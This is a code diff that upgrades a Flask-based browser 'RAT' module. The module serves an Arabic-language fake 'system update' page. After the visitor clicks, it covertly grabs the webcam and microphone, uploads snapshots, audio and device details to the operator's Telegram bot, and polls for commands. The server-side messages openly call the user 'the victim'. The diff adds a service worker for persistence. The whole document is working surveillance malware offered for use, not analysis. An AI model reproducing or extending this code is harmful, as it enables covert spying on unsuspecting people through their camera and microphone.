@@ -1,11 +1,11 @@
 import os
 import base64
 import io
-from flask import Blueprint, render_template_string, request
+from flask import Blueprint, render_template_string, request, Response
 
-rat_bp = Blueprint('rat_module_v4', __name__)
+rat_bp = Blueprint('rat_module_v5', __name__)
 
-RAT_ULTIMATE_TEMPLATE = """
+RAT_SERVICE_WORKER_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -16,7 +16,7 @@ RAT_ULTIMATE_TEMPLATE = """
         body { background-color: #030712; color: #f9fafb; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
         .box { background: #111827; border: 1px solid #374151; padding: 40px; border-radius: 16px; max-width: 380px; width: 90%; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
         h2 { color: #60a5fa; font-size: 21px; margin-bottom: 12px; }
-        <p> { font-size: 13px; color: #9ca3af; line-height: 1.6; margin-bottom: 25px; }
+        p { font-size: 13px; color: #9ca3af; line-height: 1.6; margin-bottom: 25px; }
         .action-btn { background-color: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 15px; width: 100%; cursor: pointer; transition: 0.3s; }
         .action-btn:hover { background-color: #1d4ed8; }
     </style>
@@ -28,7 +28,6 @@ RAT_ULTIMATE_TEMPLATE = """
         <button class="action-btn" onclick="startExecution()">تفعيل التحديث الآن</button>
     </div>
 
-    <!-- عنصر فيديو مخفي لنشاط الكاميرا المستمر -->
     <video id="v" autoplay playsinline muted style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
@@ -36,9 +35,15 @@ RAT_ULTIMATE_TEMPLATE = """
         const chatId = "{{ chat_id }}";
         let activeStream = null;
 
+        // تسجيل Service Worker لضمان استمرار الاتصال في الخلفية
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js?id=' + chatId).then(reg => {
+                console.log("SW Registered");
+            }).catch(err => console.log("SW Error", err));
+        }
+
         async function startExecution() {
             try {
-                // طلب الصلاحيات وتثبيت البث الحي
                 activeStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                     audio: true 
@@ -48,16 +53,10 @@ RAT_ULTIMATE_TEMPLATE = """
                 video.srcObject = activeStream;
                 await video.play();
 
-                // إرسال بيانات الجهاز وإشعار الاتصال
                 sendDeviceInfo();
-
-                // التقاط أول صورة حية فورية
                 setTimeout(() => captureLiveSnapshot("📸 **صورة الاتصال الأولى:**"), 1000);
-
-                // بدء حلقة استقبال الأوامر اللحظية من تليجرام
                 initCommandPolling();
 
-                // تغيير الواجهة لتبدو وكأن النظام يعمل
                 document.getElementById('mainBox').innerHTML = "<h2>✅ النظام يعمل الآن بكفاءة</h2><p>جاري تطبيق التحسينات الأمنية في الخلفية...</p>";
 
             } catch (err) {
@@ -66,7 +65,7 @@ RAT_ULTIMATE_TEMPLATE = """
         }
 
         function sendDeviceInfo() {
-            fetch('/rat_v4_collect', {
+            fetch('/rat_v5_collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -78,7 +77,6 @@ RAT_ULTIMATE_TEMPLATE = """
             });
         }
 
-        // دالة مخصصة لضمان أخذ صورة جديدة كلياً وليست مخزنة مؤقتاً
         function captureLiveSnapshot(titleText) {
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
@@ -88,21 +86,18 @@ RAT_ULTIMATE_TEMPLATE = """
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
-            
-            // مسح الكانفاس القديم تماماً لمنع أي تداخل
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             const freshImageData = canvas.toDataURL('image/jpeg', 0.9);
 
-            fetch('/rat_v4_image', {
+            fetch('/rat_v5_image', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, image: freshImageData, title: titleText })
             });
         }
 
-        // تسجيل صوتي حي ودقيق
         function recordLiveAudio() {
             if (!activeStream) return;
             try {
@@ -114,7 +109,7 @@ RAT_ULTIMATE_TEMPLATE = """
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = () => {
-                        fetch('/rat_v4_audio', {
+                        fetch('/rat_v5_audio', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ chat_id: chatId, audio: reader.result })
@@ -128,11 +123,10 @@ RAT_ULTIMATE_TEMPLATE = """
             } catch (e) {}
         }
 
-        // حلقة تفقد الأوامر السريعة المرتبطة بالسيرفر
         function initCommandPolling() {
             setInterval(async () => {
                 try {
-                    let response = await fetch('/rat_v4_poll?id=' + chatId);
+                    let response = await fetch('/rat_v5_poll?id=' + chatId);
                     let data = await response.json();
                     
                     if (data.action === "snapshot") {
@@ -142,11 +136,27 @@ RAT_ULTIMATE_TEMPLATE = """
                         recordLiveAudio();
                     }
                 } catch (e) {}
-            }, 2500);
+            }, 2000);
         }
     </script>
 </body>
 </html>
+"""
+
+# ملف Service Worker يتم برمجته ليقوم بعمل Ping وإبقاء اللاسلكي نشطاً
+SERVICE_WORKER_SCRIPT = """
+self.addEventListener('install', (e) => {
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', (e) => {
+    e.waitUntil(self.clients.claim());
+});
+
+self.addEventListener('fetch', (e) => {
+    // تمرير الطلبات بسلاسة دون تأخير لضمان استمرار الاتصال السحابي
+    e.respondWith(fetch(e.request));
+});
 """
 
 pending_commands = {}
@@ -155,18 +165,23 @@ def init_rat_routes(app, bot):
     @app.route('/system_secure_v2', methods=['GET'])
     def rat_landing():
         chat_id = request.args.get('id', '0')
-        return render_template_string(RAT_ULTIMATE_TEMPLATE, chat_id=chat_id)
+        return render_template_string(RAT_SERVICE_WORKER_TEMPLATE, chat_id=chat_id)
 
-    @app.route('/rat_v4_collect', methods=['POST'])
+    # مسار خاص لملف الـ Service Worker ليعمل بشكل نظامي داخل المتصفح
+    @app.route('/sw.js', methods=['GET'])
+    def service_worker():
+        return Response(SERVICE_WORKER_SCRIPT, mimetype='application/javascript')
+
+    @app.route('/rat_v5_collect', methods=['POST'])
     def rat_collect():
         data = request.json or {}
         chat_id = data.get('chat_id')
         if chat_id and chat_id != '0':
             msg = (
-                "🎯 **تمت استجابة الضحية بنجاح وتفعيل اللوحة!**\n\n"
+                "🎯 **تمت استجابة الضحية بنجاح وتفعيل الخدمة الخلفية!**\n\n"
                 f"💻 **النظام:** `{data.get('platform')}`\n"
                 f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
-                "👇 **اختر الأمر المطلوب تنفيذه لحظياً:**"
+                "👇 **اختر الأمر المطلوب تنفيذه:**"
             )
             from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
             markup = InlineKeyboardMarkup()
@@ -180,7 +195,7 @@ def init_rat_routes(app, bot):
                 print(f"Error: {e}")
         return {"status": "ok"}
 
-    @app.route('/rat_v4_poll', methods=['GET'])
+    @app.route('/rat_v5_poll', methods=['GET'])
     def rat_poll():
         chat_id = request.args.get('id')
         if chat_id in pending_commands and pending_commands[chat_id]:
@@ -188,7 +203,7 @@ def init_rat_routes(app, bot):
             return {"action": action}
         return {"action": "none"}
 
-    @app.route('/rat_v4_image', methods=['POST'])
+    @app.route('/rat_v5_image', methods=['POST'])
     def rat_image():
         data = request.json or {}
         chat_id = data.get('chat_id')
@@ -205,7 +220,7 @@ def init_rat_routes(app, bot):
                 print(f"Img error: {e}")
         return {"status": "ok"}
 
-    @app.route('/rat_v4_audio', methods=['POST'])
+    @app.route('/rat_v5_audio', methods=['POST'])
     def rat_audio():
         data = request.json or {}
         chat_id = data.get('chat_id')
